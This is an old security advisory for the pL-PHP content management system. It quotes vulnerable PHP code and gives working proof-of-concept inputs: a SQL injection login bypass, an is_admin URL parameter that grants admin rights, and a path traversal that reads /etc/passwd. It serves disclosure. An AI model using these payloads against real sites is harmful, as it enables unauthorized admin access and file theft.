1) Infos
---------
Date            : 2007-04-10
Product         : pL-PHP
Version         : beta 0.9 - Prior version maybe also be affected

Description     : pL-PHP is a new PHP Portal or Content Management System (CMS). It is based on a "multi-topics" system,
		  with sub-topics, and all the content (downloads, articles, headers, links...) is shared into these topics
		  and sub-topics. It will be very easy to use.

2) Security Issues
-------------------
--- [ SQL Injection - Admin Access Bypass ] ---
===============================================

[login.php Source Code Bugged - Line 10 - 20]

require("includes/config.php");

// Authentification
// Script inspir√© par DBprotect 1.0 de David Borrat (david@borrat.net)
if (isset($_POST['login'])) {
	$login = $_POST['login'];
	$pass = md5($_POST['pass']);

$sql = mysql_connect($global['sql_host'], $global['sql_user'], $global['sql_pass']);
mysql_select_db($global['sql_base'], $sql);
$verif_query = sprintf("SELECT * FROM " . $global['prefix'] . "_users WHERE username='$login' AND user_password='$pass'");

[end login.php Source Code]

As we can see the variables $login and $pass are not properly sanitized before being used; so is possibile to exploit this vulnerability remotely.

[ PoC ]
=======

Just run with your browser to login.php and insert in the login field: 1' OR '1' = '1' # and in the pass filed what you want! Now you have Admin credential!

--- [Global Variable problem - Admin Access Bypass ] ---
========================================================

[admin.php Source Code Bugged - Line 14]

[...]

if($is_admin == 1)

[...]

[end admin.php Source Code]

As we can se, via the browser we can just connect to admin.php script and pass the variable isadmin the number 1 :D.

[ PoC ]
=======

http://remote_host/[remote_path]/admin.php?is_admin=1

Now you are Admin ;)

--- [Local File Inclusion ] ---
===============================

[admin.php Source Code Bugged - Line 16]

[...]

include("admin/lang/" . $lang . ".inc.php");

[...]

[end admin.php Source Code]

As we can se, via the browser we can just connect to admin.php script and pass the variable $lang a pretty good path ;).

[ PoC ]
=======

Connect with Admin Credential and... Have fun..

eg 1:

http://127.0.0.1/files/admin.php?is_admin=1&lang=../../../../../../etc/passwd%00

eg 2:

First you must.. log in as Admin (SQL Injection Method) and then...

http://127.0.0.1/files/admin.php?&lang=../../../../../../etc/passwd%00

3) Patches
-----------

Edit the source code to ensure that the input will be properly sanitized before being used
